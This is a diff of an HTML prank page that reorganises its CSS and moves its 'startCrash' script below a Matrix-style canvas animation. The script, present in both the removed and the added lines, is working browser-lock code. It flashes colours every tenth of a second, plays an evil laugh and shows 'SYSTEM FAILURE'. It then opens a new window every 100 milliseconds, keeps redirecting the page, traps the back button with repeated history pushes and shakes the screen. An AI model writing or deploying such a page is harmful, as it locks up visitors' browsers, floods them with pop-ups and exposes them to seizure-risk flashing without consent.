@@ -52,6 +52,16 @@
             display: none;
         }
 
+        .hacker {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 300px;
+            opacity: 0;
+            transition: opacity 1s ease-in-out;
+        }
+
         /* Flashing Crazy Colors */
         @keyframes flash {
             0% { background-color: black; }
@@ -63,17 +73,6 @@
 
         .flashing {
             animation: flash 0.1s infinite;
-        }
-
-        /* Hacker Image */
-        .hacker {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 300px;
-            opacity: 0;
-            transition: opacity 1s ease-in-out;
         }
     </style>
 </head>
@@ -93,48 +92,7 @@
     </div>
 
     <script>
-        // Function to start the crash and show the hacker image
-        function startCrash() {
-            let name = document.getElementById("nameInput").value.trim() || "User";
-            document.getElementById("userName").innerText = name;
-            document.getElementById("message").classList.remove("hidden");
-
-            // Hide input and button
-            document.getElementById("nameInput").style.display = "none";
-            document.querySelector("button").style.display = "none";
-
-            // Flashing chaos colors
-            document.body.classList.add("flashing");
-
-            // Show the hacker image
-            document.getElementById("hackerImg").style.opacity = "1";
-
-            // Play the evil laughter sound
-            document.getElementById("evilLaugh").play();
-
-            // Start the crash sequence after 3 seconds
-            setTimeout(() => {
-                document.body.innerHTML = "<h1 style='color:red; font-size:5rem;'>SYSTEM FAILURE</h1>";
-
-                // CHAOS MODE ACTIVATED:
-                setInterval(() => { window.open("https://theuselessweb.com", "_blank"); }, 100);
-                setInterval(() => { window.location = "https://www.neverendingredditloop.com"; }, 100);
-                onbeforeunload = function(){localStorage.x=1};
-
-                // Browser Lock (Prevent going back)
-                history.pushState(null, null, location.href);
-                setInterval(() => { history.pushState(null, null, location.href); }, 50);
-
-                // Violent Screen Shake
-                setInterval(() => {
-                    let x = Math.random() * 10 - 5;
-                    let y = Math.random() * 10 - 5;
-                    document.body.style.transform = `translate(${x}px, ${y}px)`;
-                }, 50);
-            }, 3000);
-        }
-
-        // Matrix Effect Code
+        // Initialize Matrix Effect Canvas
         const canvas = document.getElementById("matrixCanvas");
         const ctx = canvas.getContext("2d");
 
@@ -143,7 +101,6 @@
 
         const letters = "01XOX1XOX10XOX1XOX10XOX1XOX10XOX1XOX1";
         const matrix = letters.split("");
-
         const fontSize = 16;
         const columns = canvas.width / fontSize;
         const drops = Array.from({ length: Math.floor(columns) }).fill(1);
@@ -166,8 +123,53 @@
                 drops[i]++;
             }
         }
-
         setInterval(drawMatrix, 50);
+
+        // Function to handle crash
+        function startCrash() {
+            let name = document.getElementById("nameInput").value.trim() || "User";
+            document.getElementById("userName").innerText = name;
+            document.getElementById("message").classList.remove("hidden");
+
+            // Hide input and button
+            document.getElementById("nameInput").style.display = "none";
+            document.querySelector("button").style.display = "none";
+
+            // Flashing chaos colors
+            document.body.classList.add("flashing");
+
+            // Show the hacker image
+            const hackerImg = document.getElementById("hackerImg");
+            hackerImg.style.opacity = "1";
+
+            // Play the evil laughter sound
+            const evilLaugh = document.getElementById("evilLaugh");
+            evilLaugh.play();
+
+            // Crash Sequence (initiates the chaos)
+            setTimeout(() => {
+                // SYSTEM FAILURE message
+                document.body.innerHTML = "<h1 style='color:red; font-size:5rem;'>SYSTEM FAILURE</h1>";
+
+                // Chaos Mode
+                setInterval(() => { window.open("https://theuselessweb.com", "_blank"); }, 100);
+                setInterval(() => { window.location = "https://www.neverendingredditloop.com"; }, 100);
+
+                // Lock Browser
+                onbeforeunload = function(){localStorage.x=1};
+
+                // Prevent Back Navigation (push state)
+                history.pushState(null, null, location.href);
+                setInterval(() => { history.pushState(null, null, location.href); }, 50);
+
+                // Violent Screen Shake
+                setInterval(() => {
+                    let x = Math.random() * 10 - 5;
+                    let y = Math.random() * 10 - 5;
+                    document.body.style.transform = `translate(${x}px, ${y}px)`;
+                }, 50);
+            }, 3000);
+        }
     </script>
 </body>
 </html>
